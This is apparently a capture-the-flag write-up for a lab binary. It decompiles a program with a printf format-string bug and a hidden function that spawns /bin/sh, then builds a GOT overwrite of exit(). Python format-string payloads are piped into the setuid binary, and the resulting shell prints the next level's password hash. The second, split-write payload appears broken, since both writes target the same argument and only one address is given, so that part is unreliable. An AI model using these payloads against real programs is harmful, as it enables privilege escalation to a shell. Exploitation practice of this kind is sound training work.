get the binary on host
* scp -P 4242 level5@192.168.56.107:./level5 ./binary/level5

decompile using ghidras
```c
/*08048504*/void main(void)
			{
				n();
				return;
			}

/*080484c2*/void n(void)
			{
				undefined local_20c [520];
			
				fgets(local_20c,512,stdin);
				printf(local_20c);
/*080484f8*/		
				exit(1);
			}

/*080484a4*/void o(void)
			{
				system("/bin/sh");
				exit(1);
			}

```
`https://axcheron.github.io/exploit-101-format-strings/` <= learn to do a GOT Overwrite

We need addr of `o()`, `exit()`, `the offset of the string` 
* o addr ====> 0x0804 84a4
* exit addr => 0x08 04 98 38 (using objdump -R)
* By trying we get an off set of 4

str => `addr exit`\
`python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$hn'" > /tmp/exploit_5; cat /tmp/exploit_5 - | ./level5` << this is valid but let try a faster way cause waiting 134 513 824 space to print is long

We can split the addr of 0 in 2 and but it in 2 time :\
`python -c "print '\x38\x98\x04\x08' + '%2048x%4\$hn' + '%31904x%4\$hn'" > /tmp/exploit_5; cat /tmp/exploit_5 - | ./level5`
```
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```